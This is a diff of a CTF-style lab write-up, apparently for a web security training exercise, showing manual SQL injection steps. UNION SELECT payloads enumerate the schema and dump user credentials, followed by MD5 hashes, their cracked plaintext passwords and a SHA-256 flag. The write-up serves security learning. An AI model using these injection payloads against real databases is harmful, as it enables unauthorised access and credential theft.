@@ -21,11 +21,11 @@ Since we are not allowed to use automated tools like sqlmap.
  5 union select table_name, table_schema from information_schema.columns 
  5 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns-- 
 ```
-4. Now we try to access users table to get users info and we get this : 2b3366bcfd44f540e630d4dc2b9b06d9 cracking it we get :	YesWeCan.
+4. Now we try to access users table to get users info and we get this  Decrypt this password -> then lower all the char. Sh256 on it and it's good !: 5ff9d0165b4f92b14994e5c685cdce28 cracking it we get :		FortyTwo. and lowering it to fortytwo and using Sh256 we get 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 ```
- 5 union SELECT town, countersign FROM Member_Sql_Injection.users LIMIT 2
+ 5 union SELECT town, countersign FROM Member_Sql_Injection.users
 ```
 5. Now we try to access users table to get db_default info and we found this : root : 3bf1114a986ba87ed28fc1b5884fc2f8 cracking it we get :shadow.
 ```
- 5 union SELECT username,password FROM Member_Brute_Force.db_default LIMIT 2
+ 5 union SELECT username,password FROM Member_Brute_Force.db_default
 ```
